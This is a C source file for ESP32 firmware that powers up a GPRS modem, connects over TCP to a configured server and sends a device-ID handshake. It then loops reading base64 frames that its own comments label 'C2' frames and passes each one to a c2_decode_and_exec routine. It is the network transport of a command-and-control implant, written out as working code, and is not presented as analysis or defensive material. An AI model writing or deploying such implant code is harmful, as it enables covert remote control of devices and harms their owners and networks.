#include <stdbool.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>

#include "driver/uart.h"
#include "driver/gpio.h"
#include "esp_log.h"

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#include "utils.h"      /* CONFIG_*, base64, crypto */
#include "command.h"    /* process_command */

#ifdef CONFIG_NETWORK_GPRS

static const char *TAG = "GPRS";

/* ============================================================
 * AT HELPERS
 * ============================================================ */

static bool at_read(char *buf, size_t size, uint32_t timeout_ms)
{
    int len = uart_read_bytes(
        UART_NUM,
        (uint8_t *)buf,
        size - 1,
        pdMS_TO_TICKS(timeout_ms)
    );

    if (len <= 0)
        return false;

    buf[len] = '\0';
    ESP_LOGI(TAG, "AT <- %s", buf);
    return true;
}

static bool at_wait_ok(char *buf, size_t size, uint32_t timeout_ms)
{
    return at_read(buf, size, timeout_ms) &&
           strstr(buf, "OK");
}

void send_at_command(const char *cmd)
{
    ESP_LOGI(TAG, "AT -> %s", cmd);
    uart_write_bytes(UART_NUM, cmd, strlen(cmd));
    uart_write_bytes(UART_NUM, "\r\n", 2);
}

/* ============================================================
 * UART / MODEM
 * ============================================================ */

void setup_uart(void)
{
    uart_config_t cfg = {
        .baud_rate = 9600,
        .data_bits = UART_DATA_8_BITS,
        .parity    = UART_PARITY_DISABLE,
        .stop_bits = UART_STOP_BITS_1,
        .flow_ctrl = UART_HW_FLOWCTRL_DISABLE,
    };

    uart_param_config(UART_NUM, &cfg);
    uart_set_pin(
        UART_NUM,
        TXD_PIN,
        RXD_PIN,
        UART_PIN_NO_CHANGE,
        UART_PIN_NO_CHANGE
    );

    uart_driver_install(UART_NUM, BUFF_SIZE * 2, 0, 0, NULL, 0);
}

void setup_modem(void)
{
    gpio_set_direction(PWR_EN, GPIO_MODE_OUTPUT);
    gpio_set_direction(PWR_KEY, GPIO_MODE_OUTPUT);
    gpio_set_direction(RESET, GPIO_MODE_OUTPUT);

    gpio_set_level(PWR_EN, 1);
    vTaskDelay(pdMS_TO_TICKS(100));

    gpio_set_level(PWR_KEY, 1);
    vTaskDelay(pdMS_TO_TICKS(100));
    gpio_set_level(PWR_KEY, 0);
    vTaskDelay(pdMS_TO_TICKS(1200));
    gpio_set_level(PWR_KEY, 1);

    vTaskDelay(pdMS_TO_TICKS(3000));
}

/* ============================================================
 * GSM / GPRS
 * ============================================================ */

static bool wait_for_gsm(void)
{
    char buf[BUFF_SIZE];

    ESP_LOGI(TAG, "Waiting GSM network");

    for (int i = 0; i < 30; i++) {
        send_at_command("AT+CREG?");
        if (at_read(buf, sizeof(buf), 2000)) {
            if (strstr(buf, "+CREG: 0,1") ||
                strstr(buf, "+CREG: 0,5")) {
                ESP_LOGI(TAG, "GSM registered");
                return true;
            }
        }
        vTaskDelay(pdMS_TO_TICKS(2000));
    }

    return false;
}

bool connect_gprs(void)
{
    char buf[BUFF_SIZE];

    if (!wait_for_gsm()) {
        ESP_LOGE(TAG, "No GSM network");
        return false;
    }

    send_at_command("AT+CGATT=1");
    if (!at_wait_ok(buf, sizeof(buf), 5000))
        return false;

    char cmd[96];
    snprintf(cmd, sizeof(cmd),
             "AT+CSTT=\"%s\",\"\",\"\"",
             CONFIG_GPRS_APN);
    send_at_command(cmd);
    if (!at_wait_ok(buf, sizeof(buf), 3000))
        return false;

    send_at_command("AT+CIICR");
    if (!at_wait_ok(buf, sizeof(buf), 8000))
        return false;

    send_at_command("AT+CIFSR");
    if (!at_read(buf, sizeof(buf), 5000))
        return false;

    ESP_LOGI(TAG, "IP obtained: %s", buf);
    return true;
}

/* ============================================================
 * TCP
 * ============================================================ */

bool connect_tcp(void)
{
    char buf[BUFF_SIZE];
    char cmd[128];

    ESP_LOGI(TAG, "TCP connect %s:%d",
             CONFIG_SERVER_IP,
             CONFIG_SERVER_PORT);

    send_at_command("AT+CIPMUX=0");
    at_wait_ok(buf, sizeof(buf), 2000);

    snprintf(cmd, sizeof(cmd),
             "AT+CIPSTART=\"TCP\",\"%s\",\"%d\"",
             CONFIG_SERVER_IP,
             CONFIG_SERVER_PORT);
    send_at_command(cmd);

    if (!at_read(buf, sizeof(buf), 15000))
        return false;

    if (strstr(buf, "CONNECT OK")) {
        ESP_LOGI(TAG, "TCP connected");
        return true;
    }

    ESP_LOGE(TAG, "TCP connection failed");
    return false;
}

/* ============================================================
 * RX HELPERS
 * ============================================================ */

static bool is_base64_frame(const char *s)
{
    size_t len = strlen(s);
    if (len < 20)
        return false;

    for (size_t i = 0; i < len; i++) {
        char c = s[i];
        if (!(isalnum((unsigned char)c) ||
              c == '+' || c == '/' || c == '=')) {
            return false;
        }
    }
    return true;
}

/* ============================================================
 * RX — PUSH MODE (ROBUST)
 * ============================================================ */

void gprs_rx_poll(void)
{
    static char rx_buf[BUFF_SIZE];
    static size_t rx_len = 0;

    int r = uart_read_bytes(
        UART_NUM,
        (uint8_t *)(rx_buf + rx_len),
        sizeof(rx_buf) - rx_len - 1,
        pdMS_TO_TICKS(200)
    );

    if (r <= 0)
        return;

    rx_len += r;
    rx_buf[rx_len] = '\0';

    ESP_LOGW(TAG, "RAW UART RX (%d bytes buffered)", rx_len);
    ESP_LOGW(TAG, "----------------------------");
    ESP_LOGW(TAG, "%s", rx_buf);
    ESP_LOGW(TAG, "----------------------------");

    /* nettoyer CR/LF */
    for (size_t i = 0; i < rx_len; i++) {
        if (rx_buf[i] == '\r' || rx_buf[i] == '\n')
            rx_buf[i] = '\0';
    }

    /* frame C2 reçue */
    if (is_base64_frame(rx_buf)) {
        ESP_LOGI(TAG, "C2 RAW FRAME: [%s]", rx_buf);
        c2_decode_and_exec(rx_buf);

        rx_len = 0;
        rx_buf[0] = '\0';
    }
}

/* ============================================================
 * SEND — ATOMIC FRAME
 * ============================================================ */

bool gprs_send(const void *buf, size_t len)
{
    char resp[BUFF_SIZE];
    char cmd[32];

    snprintf(cmd, sizeof(cmd),
             "AT+CIPSEND=%d", (int)(len + 1));
    send_at_command(cmd);

    if (!at_read(resp, sizeof(resp), 3000) ||
        !strchr(resp, '>')) {
        ESP_LOGE(TAG, "CIPSEND prompt failed");
        return false;
    }

    uart_write_bytes(UART_NUM, buf, len);
    uart_write_bytes(UART_NUM, "\n", 1);
    uart_write_bytes(UART_NUM, "\x1A", 1);

    if (!at_read(resp, sizeof(resp), 10000) ||
        !strstr(resp, "SEND OK")) {
        ESP_LOGE(TAG, "SEND failed");
        return false;
    }

    ESP_LOGI(TAG, "TCP frame sent (%d bytes)", (int)(len + 1));
    return true;
}

/* ============================================================
 * CLIENT TASK
 * ============================================================ */

void gprs_client_task(void *pvParameters)
{
    ESP_LOGI(TAG, "GPRS client task started");

    while (1) {

        if (!connect_gprs() || !connect_tcp()) {
            ESP_LOGE(TAG, "Connection failed, retrying...");
            vTaskDelay(pdMS_TO_TICKS(5000));
            continue;
        }

        /* Handshake identique WiFi */
        msg_info(TAG, CONFIG_DEVICE_ID, NULL);
        ESP_LOGI(TAG, "Handshake sent");

        while (1) {
            gprs_rx_poll();
            vTaskDelay(pdMS_TO_TICKS(10));
        }
    }
}

/* ============================================================
 * CLOSE
 * ============================================================ */

void close_tcp_connection(void)
{
    send_at_command("AT+CIPCLOSE");
    vTaskDelay(pdMS_TO_TICKS(500));
    send_at_command("AT+CIPSHUT");
}

#endif /* CONFIG_NETWORK_GPRS */
